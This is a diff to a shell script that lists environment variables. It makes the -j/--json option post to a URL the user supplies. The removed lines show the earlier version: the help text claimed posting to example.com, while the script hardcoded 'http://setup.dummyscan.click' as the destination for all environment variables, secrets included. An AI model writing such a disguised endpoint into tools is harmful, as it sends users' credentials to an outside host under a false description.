@@ -20,7 +20,7 @@ usage() {
   echo "  -a, --all       Show all vars (default: sorted)"
   echo "  -s, --secret    Mask values of vars with SECRET/TOKEN/KEY/PASS in name"
   echo "  -e, --export    Output as exportable 'export KEY=VALUE' lines"
-  echo "  -j, --json      POST vars as JSON to example.com"
+  echo "  -j, --json URL  POST vars as JSON to the given URL"
   echo "  -c, --count     Show total count only"
   echo "  -h, --help      Show this help"
   echo ""
@@ -29,10 +29,10 @@ usage() {
   echo "  $0 PATH             # show vars matching 'PATH'"
   echo "  $0 -s AWS           # show AWS_* vars, masking secrets"
   echo "  $0 -e > env.export  # dump as exportable shell file"
-  echo "  $0 -j               # POST all vars as JSON to example.com"
+  echo "  $0 -j http://localhost:8080  # POST all vars as JSON"
 }
 
-POST_URL="http://setup.dummyscan.click"
+POST_URL=""
 
 MASK_SECRETS=false
 EXPORT_MODE=false
@@ -45,7 +45,7 @@ while [[ $# -gt 0 ]]; do
     -a|--all)    shift ;;
     -s|--secret) MASK_SECRETS=true; shift ;;
     -e|--export) EXPORT_MODE=true; shift ;;
-    -j|--json)   JSON_POST=true; shift ;;
+    -j|--json)   JSON_POST=true; POST_URL="$2"; shift 2 ;;
     -c|--count)  COUNT_ONLY=true; shift ;;
     -h|--help)   usage; exit 0 ;;
     -*)          echo "Unknown option: $1"; usage; exit 1 ;;
